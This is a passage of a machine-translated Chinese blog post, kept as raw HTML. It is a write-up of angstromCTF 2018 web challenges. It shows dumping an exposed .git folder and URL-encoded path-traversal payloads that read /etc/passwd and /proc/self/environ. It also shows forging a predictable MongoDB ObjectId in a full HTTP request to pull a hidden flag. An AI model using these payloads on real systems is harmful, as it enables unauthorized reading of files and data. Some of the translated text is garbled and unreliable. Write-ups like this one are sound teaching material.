jz ka kb ny kd ke kf nz kh ki kj kk ij bi translated">服务器:Werkzeug/0.14.1 Python/2.7.12</p></blockquote><p id="fc42" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">是新的Python框架Bug？~~</p><p id="6b1a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">好的，让我们继续我们的搜索…让我们检查这个文件上传到哪里？</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi oo"><img src="../Images/448a5cfe01fb84b45c3a5620cc8000c6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hhPsud6jGT1aFf8cmnCRHA.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">HTTP标头</figcaption></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi op"><img src="../Images/bd2cb394e7342bad1924146aed109045.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OkM8EzjRFq0UURGQ-ypf8Q.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated"><a class="ae ma" href="http://web2.angstromctf.com:8899/files/1521837261-upload.html" rel="noopener ugc nofollow" target="_blank">http://web 2 . angstromctf . com:8899/files/1521837261-upload . html</a></figcaption></figure><p id="86de" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">嗯……让我们回到<strong class="jp ir">/文件</strong>目录<strong class="jp ir"> </strong>去看看那里有什么！</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi oq"><img src="../Images/2c50751f9553759c866ae23f2a74e187.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*H6zuJsouQOIQkQ4lWIVxAw.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">没有找到！</figcaption></figure><p id="44f7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">好了，让我们检查一下<strong class="jp ir"> <em class="mf">。git </em> </strong>文件夹是存在那里的！</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi or"><img src="../Images/3e1d58aca488b59c99e75fcd23f27bdd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1304/format:webp/1*4MOA1DhMxkF8SjqHEfG8xg.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">/.git文件夹存在！</figcaption></figure><p id="8d06" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有一个<strong class="jp ir"> /。服务器上的git/ </strong>文件夹，我们用<a class="ae ma" href="https://github.com/internetwache/GitTools" rel="noopener ugc nofollow" target="_blank"><strong class="jp ir"><em class="mf">git dumper</em></strong></a>转储吧:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi os"><img src="../Images/40648a5b13dc26d98b65d70d48d78a7d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5r8qDVrZaTiyJeInlKFZuQ.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">甩了/。使用Getdumper工具创建git/ folder</figcaption></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ot"><img src="../Images/56eb4a0b9ba9c588a240aba908203480.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*PCGAKGIJxqHLl7MYHwtAjA.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">找到了b/index.py！</figcaption></figure><p id="0669" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">甩了<strong class="jp ir">后<em class="mf">。git </em> </strong> repo，检查日志并使用<strong class="jp ir"> <em class="mf">显示提交。git命令</em> </strong>我们发现了一个非常有趣的python脚本‘b/index . py’，因为它意味着这是一个由<strong class="jp ir"><em class="mf">Flask Framework</em></strong>开发的python web应用程序。</p><p id="420a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是<strong class="jp ir"> <em class="mf"> index.py </em> </strong>脚本:</p><figure class="km kn ko kp gt kq"><div class="bz fp l di"><div class="md me l"/></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">索引. py</figcaption></figure><p id="b4f7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在我读完代码后，我注意到有一个有趣的bug，我喜欢尝试一下，这就是<a class="ae ma" href="https://www.owasp.org/index.php/Path_Traversal" rel="noopener ugc nofollow" target="_blank"> <strong class="jp ir"> <em class="mf">遍历目录</em> </strong> </a>。</p><p id="93c5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我建议你像我在发现、识别和利用它之前一样去阅读它！</p><p id="adde" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这些是我读到的主题:<a class="ae ma" href="https://nealpoole.com/blog/tag/directory-traversal/" rel="noopener ugc nofollow" target="_blank"> <strong class="jp ir"> <em class="mf">通过PHP多文件上传进行目录遍历</em> </strong> </a>。</p><p id="8bf6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">尽管这是Python易受攻击的Web应用程序，但我只是基于PHP开发文章来使其可被利用！</p><p id="900a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">通常，我们会使用路径来引用磁盘或其他资源上的文件。<strong class="jp ir"> <em class="mf">路径遍历攻击</em> </strong>是指攻击者提供与我们的路径一起使用的输入，以访问文件系统上我们并不打算访问的文件。输入通常试图打开应用程序的工作目录，并访问文件系统中其他地方的文件。通过使用受限文件权限配置文件来限制文件系统访问的范围和减少表面，可以缓解这类攻击。</p><p id="76d7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">web应用程序中<strong class="jp ir"> <em class="mf">路径遍历</em> </strong>的典型远程向量可能涉及在文件系统上提供或存储文件。</p><p id="79bc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">由于攻击者控制直接用于构建路径的输入，因此他们能够访问系统上的任何文件。我第一次尝试用这个方法读取<strong class="jp ir"> <em class="mf"> /etc/passwd </em> </strong>但是被过滤了！</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ou"><img src="../Images/cbcccf399605e68e3d97fd894ccb58f4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*s3_cgu7EKf9e9n1d7B5KfQ.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">正在尝试读取/etc/passwd</figcaption></figure><p id="d83c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">基于Neal Poole的第一篇博客，我刚刚生成了另一个有效载荷来绕过这个过滤器，然后最后我读取了<strong class="jp ir"> <em class="mf"> /etc/passwd </em> </strong></p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ox"><img src="../Images/78ed277c2decde060af2a84c403f5363.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*SXtIfCudFrsl56BU1LNGWw.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">阅读/etc/passwd</figcaption></figure><p id="0eaf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我只是用这个有效载荷读取了<strong class="jp ir"> <em class="mf"> /etc/passwd </em> </strong>:</p><blockquote class="nu nv nw"><p id="ec1b" class="jn jo mf jp b jq jr js jt ju jv jw jx nx jz ka kb ny kd ke kf nz kh ki kj kk ij bi translated">/文件/..%2f..%2f..%2f..%2f..%2fetc%2fpasswd</p></blockquote><p id="f8a1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们试着找到旗子存放的地方！</p><p id="4e18" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">经过一番搜索:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi oy"><img src="../Images/1648bb105cb364e873e5c86dc4564e69.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*sMrosoqirHhfydYiovDoYw.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk">/</figcaption></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi oz"><img src="../Images/53b02172ec481e7b88f43d6603ccf7df.png" data-original-src="https://miro.medium.com/v2/resize:fit:1052/format:webp/1*KoF1rQz03IadPWw-70XMKw.png"/></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">/proc/self/</figcaption></figure><p id="17e3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我刚刚检查了所有的文件，我得到标志存储在一个名为<strong class="jp ir"> FLAG </strong>的环境变量中<strong class="jp ir"><em class="mf">/proc/self/environ</em></strong></p><blockquote class="nu nv nw"><p id="5c37" class="jn jo mf jp b jq jr js jt ju jv jw jx nx jz ka kb ny kd ke kf nz kh ki kj kk ij bi translated">FLAG = actf { 2 _ und 3 RSC 0 RES _ h1 des _ n0th 1 ng }</p></blockquote><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi pa"><img src="../Images/c69878ff7c23349142b9d942523929ae.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qP6Wpc_QCwaOkkzmpzaiOQ.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">旗子快没了！</figcaption></figure><p id="70ab" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我只是用这个有效载荷读取了<strong class="jp ir"><em class="mf">/proc/self/environ</em></strong>:</p><blockquote class="nu nv nw"><p id="ed2d" class="jn jo mf jp b jq jr js jt ju jv jw jx nx jz ka kb ny kd ke kf nz kh ki kj kk ij bi translated">/文件/..%2f..%2f..%2f..%2f..%2fproc%2fself%2fenviron</p></blockquote><p id="5a3c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">标志为:actf { 2 _ und 3 RSC 0 RES _ h1 des _ n 0 th1ng }</strong></p><h1 id="73dd" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">最佳网站[230分]</h1><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi pb"><img src="../Images/2dc6816a9902e6688ab88a526f6837d0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qEax5SmSSaGMWKWptH9SHQ.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated"><a class="ae ma" href="http://web.angstromctf.com:7667/" rel="noopener ugc nofollow" target="_blank">http://web.angstromctf.com:7667</a></figcaption></figure><p id="5ec1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">对于这个挑战，参赛者提供了一个网站，他们应该做一些事情来获得旗帜！</p><p id="94f7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">查看-来源it:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi pc"><img src="../Images/ab83cc30fe5cc45bf6905f40a67af521.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-O-8gMdRoXsS4FI7aMYcNg.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">最佳网站的源代码</figcaption></figure><blockquote class="nu nv nw"><p id="29d0" class="jn jo mf jp b jq jr js jt ju jv jw jx nx jz ka kb ny kd ke kf nz kh ki kj kk ij bi translated"/></blockquote><p id="423d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">嗯…那就够有趣的了！</p><p id="829f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们试着查一下<strong class="jp ir"> <em class="mf"> log.txt </em> </strong>:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi pd"><img src="../Images/652899be6b360e0fac47d62474aec6f8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Oa6uUkx4DyRdLRME3Vc02w.png"/></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">/log.txt</figcaption></figure><p id="303f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">听起来不错，这是一个访问日志文件！</p><p id="9e0d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">同样的源代码中，还有另外一个有趣的JS脚本<strong class="jp ir"> <em class="mf"> js/init.js </em> </strong>:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi pe"><img src="../Images/0c9aa32cee638df312fe81b4497005ce.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7IhZTqoHe8jlBj9S0AmRBg.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">最佳网站的源代码</figcaption></figure><p id="1428" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们来看看:</p><figure class="km kn ko kp gt kq"><div class="bz fp l di"><div class="md me l"/></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">js/初始化. js</figcaption></figure><p id="bd60" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是HTTP头(GET请求):</p><pre class="km kn ko kp gt pf pg ph pi aw pj bi"><span id="4089" class="mj lc iq pg b gy pk pl l pm pn">GET /boxes?ids=5aad412be07e1e001cfce6d2,5aad412be07e1e001cfce6d3,5aad412be07e1e001cfce6d4 HTTP/1.1<br/>Host: web.angstromctf.com:7667<br/>User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0<br/>Accept: */*<br/>Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3<br/>Accept-Encoding: gzip, deflate<br/>Referer: <a class="ae ma" href="http://web.angstromctf.com:7667/" rel="noopener ugc nofollow" target="_blank">http://web.angstromctf.com:7667/</a><br/>X-Requested-With: XMLHttpRequest<br/>Connection: close<br/>If-None-Match: W/”183-Tv299FSONRL0nObibB59WErSwqE”</span></pre><p id="1ed1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">嗯……有个有趣的三个id；都在<strong class="jp ir"> <em class="mf"> init.js </em> </strong>和<strong class="jp ir"> <em class="mf"> HTTP头</em> </strong>！</p><p id="0be4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">还有另一种机制:</p><blockquote class="nu nv nw"><p id="46f8" class="jn jo mf jp b jq jr js jt ju jv jw jx nx jz ka kb ny kd ke kf nz kh ki kj kk ij bi translated">x-Requested-With:XMLHttpRequest</p></blockquote><p id="2163" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这些信息让我困惑的思考着<a class="ae ma" href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)" rel="noopener ugc nofollow" target="_blank"> <strong class="jp ir"> <em class="mf"> CSRF漏洞</em></strong></a><strong class="jp ir"><em class="mf"/></strong>！</p><p id="149b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我浪费时间搜索和阅读更多关于<strong class="jp ir"> <em class="mf"> CSRF漏洞</em> </strong>以及如何利用它在我的情况下，我读了一大堆文章和博客，最后我得到了没有办法…这不是<strong class="jp ir"> <em class="mf"> CSRF漏洞</em> </strong>，这是另一个错误！</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi po"><img src="../Images/1145dc6b3899786019b7fddfbf7eb474.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*sPfnW3nW78qxUc4uVZsXDQ.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">HTTP GET请求/响应</figcaption></figure><p id="c933" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是到目前为止的HTTP响应:</p><pre class="km kn ko kp gt pf pg ph pi aw pj bi"><span id="1abb" class="mj lc iq pg b gy pk pl l pm pn">{“boxes”:[{“_id”:”5aad412be07e1e001cfce6d2",”data”:”Go away.^This website has literally nothing of interest. You might as well leave.”,”__v”:0},{“_id”:”5aad412be07e1e001cfce6d3",”data”:”You will be very bored.^Seriously, there’s nothing interesting.”,”__v”:0},null]}</span></pre><p id="76fb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">好像是JSON！</p><p id="94ae" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在我搜索了这到底是什么并询问了管理员之后，我得到的答案是这取决于<a class="ae ma" href="https://en.wikipedia.org/wiki/MongoDB" rel="noopener ugc nofollow" target="_blank"><strong class="jp ir"><em class="mf">MongoDB</em></strong></a>。</p><p id="f5c3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">准确的说，我最后得到的是<strong class="jp ir"/>数据库中的<a class="ae ma" href="https://en.wikipedia.org/wiki/BSON" rel="noopener ugc nofollow" target="_blank"><strong class="jp ir"><em class="mf"/></strong></a><strong class="jp ir"><em class="mf"/></strong>，这三个id是<a class="ae ma" href="https://docs.mongodb.com/manual/reference/method/ObjectId/" rel="noopener ugc nofollow" target="_blank"><strong class="jp ir"><em class="mf">MongoDB ObjectIds</em></strong></a>。</p><p id="9314" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是<strong class="jp ir">的<em class="mf"> ObjectId </em>的</strong>组件:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi pp"><img src="../Images/342dee8525b7b726eb1a10c410c9dc0b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1kRBHO2k5_GA6u-UF0pAcg.png"/></div></div></figure><p id="70fb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">读完之后，我只是浪费了一点时间去思考如何才能得到这个标志，我没有办法访问那里的任何数据库~~</p><p id="956e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我考虑过<a class="ae ma" href="https://www.owasp.org/index.php/Blind_SQL_Injection" rel="noopener ugc nofollow" target="_blank"> <strong class="jp ir"> <em class="mf">盲目SQL注入</em> </strong> </a>但是我试了很多次，没有发现任何有趣的结果。</p><p id="6454" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是，为什么<strong class="jp ir"> <em class="mf"> log.txt </em> </strong>文件是存在的呢？</p><p id="4dfe" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> <em class="mf"> log.txt </em> </strong>文件给我们一些带有日期的事件。正如我们所知，<strong class="jp ir"> <em class="mf"> ObjectId </em> </strong>的第一部分是4个字节的值，表示自Unix epoch以来的秒数。所以，<strong class="jp ir"> <em class="mf"> log.txt </em> </strong>文件和<strong class="jp ir"> <em class="mf"> ObjectId </em> </strong>之间是有关系的。</p><p id="20f6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我想通了，可以用<strong class="jp ir"> <em class="mf"> log.txt </em> </strong>中的最后一个事件日期生成一个新的<strong class="jp ir"> <em class="mf"> ObjectId </em> </strong>。</p><p id="68bb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">生成新的ObjectId: </strong></p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi pq"><img src="../Images/fd53c05d82d7194f9d27497576d40d1f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Z8xaEOHQ9l3_69BU7ME6ew.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">log.txt文件中的事件</figcaption></figure><p id="fd26" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们的目标:</p><pre class="km kn ko kp gt pf pg ph pi aw pj bi"><span id="7bb9" class="mj lc iq pg b gy pk pl l pm pn">5aad412be07e1e001c<strong class="pg ir">fce6d2 &lt;- counter, random value (the 1st event)</strong><br/>5aad412be07e1e001c<strong class="pg ir">fce6d3 &lt;- counter, random value (the 2nd event) </strong><br/>5aad412be07e1e001c<strong class="pg ir">fce6d4 &lt;- counter, random value (the 3rd event)</strong></span></pre><p id="5d68" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我将编辑基于时间戳的第一部分，让我们基于第5个事件的新时间戳生成一个新的ObjectId(“将超级机密标志添加到数据库”)，以读取由<a class="ae ma" href="https://steveridout.github.io/mongo-object-time/" rel="noopener ugc nofollow" target="_blank"><strong class="jp ir"><em class="mf">MongoDB ObjectId-to-Timestamp转换器</em></strong></a><strong class="jp ir"><em class="mf">:</em></strong>添加到数据库的超级机密标志</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi pr"><img src="../Images/1d6703d8fe79e2be996de7f0235d6960.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ssCgpcl6xAcMPio6lQjAmw.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">MongoDB ObjectId 时间戳转换器</figcaption></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi ps"><img src="../Images/ee8c4e4a0e36a2efbe03cfc341cb3296.png" data-original-src="https://miro.medium.com/v2/resize:fit:1390/format:webp/1*kn2Za8uYRhBQFS8XNGCkOg.png"/></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">根据这个日期生成您的时间戳</figcaption></figure><p id="ce37" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最后，我得到了我的新<em class="mf"> ObjectId </em>的第一部分！</p><p id="a1a7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">第二部分(机器标识符)和第三部分(pid)在任何<em class="mf"> ObjectId </em>之间是公共的，第四部分和最后一部分(计数器)从<em class="mf"> ObjectId </em>变为另一个。</p><p id="e30f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们的ObjectIds计数器随机从<strong class="jp ir"> 0xfce6d2 </strong>开始，在flag的事件之前我们有3个事件，因此我们的flag的事件是第4个事件，并且将把<strong class="jp ir"> 0xfce6d5 </strong>作为计数器值。</p><p id="e7c4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们的第四个<em class="mf"> ObjectId </em>将是:</p><pre class="km kn ko kp gt pf pg ph pi aw pj bi"><span id="8109" class="mj lc iq pg b gy pk pl l pm pn"><strong class="pg ir">5aad4131</strong>e07e1e001c<strong class="pg ir">fce6d5</strong></span></pre><p id="1999" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们尝试用这个<em class="mf"> ObjectId </em>而不是旧的<em class="mf">ObjectId</em>重新发送请求:</p><pre class="km kn ko kp gt pf pg ph pi aw pj bi"><span id="0251" class="mj lc iq pg b gy pk pl l pm pn">GET /boxes?ids=<strong class="pg ir">5aad4131</strong>e07e1e001c<strong class="pg ir">fce6d5</strong>,5aad412be07e1e001cfce6d3,5aad412be07e1e001cfce6d4 HTTP/1.1<br/>Host: web.angstromctf.com:7667<br/>User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0<br/>Accept: */*<br/>Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3<br/>Accept-Encoding: gzip, deflate<br/>Referer: <a class="ae ma" href="http://web.angstromctf.com:7667/" rel="noopener ugc nofollow" target="_blank">http://web.angstromctf.com:7667/</a><br/>X-Requested-With: XMLHttpRequest<br/>Connection: close<br/>If-None-Match: W/"183-Tv299FSONRL0nObibB59WErSwqE"</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi pt"><img src="../Images/ed76efde15385d5d6fc169d21d756fcb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*mTvV8wm_p25TasBDKMWvXw.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">重新发送新的ObjectId，而不是旧的ObjectId</figcaption></figure><pre class="km kn ko kp gt pf pg ph pi aw pj bi"><span id="4c3e" class="mj lc iq pg b gy pk pl l pm pn">HTTP/1.1 200 OK<br/>X-Powered-By: Express<br/>Content-Type: text/html; charset=utf-8<br/>Content-Length: 336<br/>ETag: W/"150-hFnDh2xD7F74/VhzVJopSoSo22Y"<br/>Date: Mon, 26 Mar 2018 03:25:26 GMT<br/>Connection: close</span><span id="481d" class="mj lc iq pg b gy pu pl l pm pn">{"boxes":[{"_id":"5aad4131e07e1e001cfce6d5","data":"<strong class="pg ir">actf{0bj3ct_ids_ar3nt_s3cr3ts}</strong>","__v":0},{"_id":"5aad412be07e1e001cfce6d3","data":"You will be very bored.^Seriously, there's nothing interesting.","__v":0},{"_id":"5aad412be07e1e001cfce6d4","data":"Please just leave.^Scrolling more will only give you more boring content.","__v":0}]}</span></pre><p id="84c8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">标志为:actf { 0 bj 3c t _ ids _ ar3nt _ s 3c R3 ts }</strong></p><h1 id="6e34" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">结论</h1><p id="2d65" class="pw-post-body-paragraph jn jo iq jp b jq mv js jt ju mw jw jx jy mx ka kb kc my ke kf kg mz ki kj kk ij bi translated">我希望这种风格的报道能激励其他CTF球员揭露更多他们遇到的失败，而不仅仅是强调他们的成功。至于激励信息安全专业人士。我希望这个未经审查的账户能激励你继续努力，不管你遇到什么样的障碍。</p><p id="1f60" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy 